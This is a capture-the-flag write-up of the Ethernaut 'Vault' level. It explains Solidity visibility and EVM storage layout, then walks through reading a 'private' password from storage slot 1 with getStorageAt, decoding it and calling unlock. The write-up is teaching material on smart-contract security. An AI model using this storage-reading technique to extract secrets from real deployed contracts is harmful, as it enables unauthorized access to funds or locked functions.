# 08 - Vault

## Challenge

Unlock the vault to pass the level!

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

## Summary

Upon construction, `locked` is set to true, and a random `bytes32 password` is generated. The `unlock` function can be called to set `locked` to false if the `password` is correct (which is impossible without knowning the actual password, since we cannot brute force the password easily).

The vulnerability is that the `password` is not actually `private` as it claims to be. I have read a nice [article](https://quillaudits.medium.com/accessing-private-data-in-smart-contracts-quillaudits-fe847581ce6d#:~:text=In%20solidity%2C%20%E2%80%9CPrivate%E2%80%9D%20variables,data%20from%20outside%20the%20blockchain.) about accessing private data in smart contracts. I will do a quick summary here for learning purposes.

1. State Variable Visibility

- `public`: the variable can be accessed by any contract or external account.
- `private`: the variable can only be accessed by the contract that defines it.
- `internal`: the variable can only be accessed by the contract that defines it, and by contracts that inherit from it.

2. Storage layout in EVM

The EVM stores smart contract state variables in the order that they were declared in slots on the blockchain. The default value of each slot is always 0. Each memory slot can hold up to 32 bytes of data.

Similar to how C++ struct handles memory, the EVM will try to pack variables into the same slot if possible. If two or more variables fit into a single 32-byte slot, they are packed into the same slot, beginning on the right.

![Example from the article](https://miro.medium.com/v2/resize:fit:828/0*o1wWiHD0wupwrttD)

Now, you can access a private variable by 

- Get the slot you want to access, e.g. slot 1
- Use any library (e.g. `ethers.js`) to read the memory slots of the contract on the blockchain. e.g. `await ethers.provider.getStorageAt(contract_address, 1);`
- Decode the returned hex encoded value to get the value of the private variable.

## Walkthrough

In Devtool,

```js
> await web3.eth.getStorageAt(await contract.address, 0)
'0x0000000000000000000000000000000000000000000000000000000000000001' # locked = true
> await web3.eth.getStorageAt(await contract.address, 1)
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29' # password
```

[Decode](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')&input=NDEyMDc2NjU3Mjc5MjA3Mzc0NzI2ZjZlNjcyMDczNjU2MzcyNjU3NDIwNzA2MTczNzM3NzZmNzI2NDIwM2EyOQ) the hex gives password `A very strong secret password :)`. Now we just call `unlock` with this password. Note that `bytes32` can be passed as hex, so you don't really need to actually see the plaintext password :)

```js
> await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29');
{tx: '0x42808f7a2b97bae94fb60ab7d711fb466ec3ab7023a67a3297f71a1aa843c8cb', receipt: {…}, logs: Array(0)}
```

Finally, submit the instance to pass the level.

## Afterword

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it.